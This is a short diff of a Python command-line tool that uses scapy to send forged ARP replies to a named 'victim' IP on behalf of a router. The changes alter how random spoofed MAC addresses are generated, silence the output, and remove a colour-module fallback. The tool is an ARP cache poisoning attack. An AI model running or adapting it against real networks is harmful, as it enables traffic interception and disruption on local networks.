@@ -5,11 +5,6 @@ import scapy.layers.l2
 from typing import Optional
 import random
 import time
-try:
-    from cli_colors import colors
-except ModuleNotFoundError:
-    # This should return "" instead of the color escape code
-    colors = type("MockColors",(str,),{"__getattr__":lambda*a:a[0],"__str__":lambda*a:"","__repr__":lambda*a:""})
 
 app = typer.Typer()
 
@@ -21,8 +16,10 @@ def entry_point(victim_ip: str = typer.Argument(..., help="The ip of the victim 
         send_arp_response(victim_ip, router_ip, mac_addr)
         time.sleep(delay)
 
-def get_mac_address() -> str:
-    octs = [random.randrange(255) for _ in range(6)]
+def get_mac_address(unicast: bool = False, universal: bool = False) -> str:
+    lb = (not unicast) + ((not universal) << 1)
+    foct = lb + (random.randint(0,63) << 2)
+    octs = [foct] + [random.randrange(255) for _ in range(5)]
     return ":".join(f"{i:X}" for i in octs)
 
 def send_arp_response(dst_ip: str, src_ip: str, hwsrc: Optional[str]=None) -> None:
@@ -34,7 +31,8 @@ def send_arp_response(dst_ip: str, src_ip: str, hwsrc: Optional[str]=None) -> No
             psrc=src_ip,
             pdst=dst_ip,
             hwsrc=hwsrc
-        )
+        ),
+        verbose=False
     )
 
 if __name__ == "__main__":
